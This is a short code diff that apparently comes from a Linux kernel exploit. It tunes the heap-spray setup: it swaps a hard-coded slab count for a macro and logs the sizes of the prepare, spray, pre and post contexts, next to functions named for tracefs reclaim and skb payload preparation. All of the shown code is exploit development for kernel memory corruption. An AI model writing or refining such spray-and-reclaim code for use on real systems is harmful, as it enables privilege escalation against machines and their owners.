@@ -1584,7 +1584,7 @@ static int reclaim_tracefs_finish(struct reclaim_tracefs_gate *gate) {
 #endif
 
 void prepare_ctxs(void) {
-  prepare_ctx.mm_cnt = 32 * mm_objs_per_slab;
+  prepare_ctx.mm_cnt = KERNEL_PAGE_PREP_SLABS * mm_objs_per_slab;
   prepare_ctx.childs = calloc(sizeof(pid_t), prepare_ctx.mm_cnt);
   prepare_ctx.memfds = calloc(sizeof(int), prepare_ctx.mm_cnt);
 
@@ -1599,6 +1599,10 @@ void prepare_ctxs(void) {
   post_ctx.mm_cnt = mm_objs_per_slab;
   post_ctx.childs = calloc(sizeof(pid_t), post_ctx.mm_cnt);
   post_ctx.memfds = calloc(sizeof(int), post_ctx.mm_cnt);
+
+  pr_info("kernel page reclaim prep slabs=%d prep=%zu spray=%zu pre=%zu post=%zu\n",
+          KERNEL_PAGE_PREP_SLABS, prepare_ctx.mm_cnt, spray_ctx.mm_cnt,
+          pre_ctx.mm_cnt, post_ctx.mm_cnt);
 }
 
 int prepare_skb_payload(uintptr_t base, int payload_mode) {
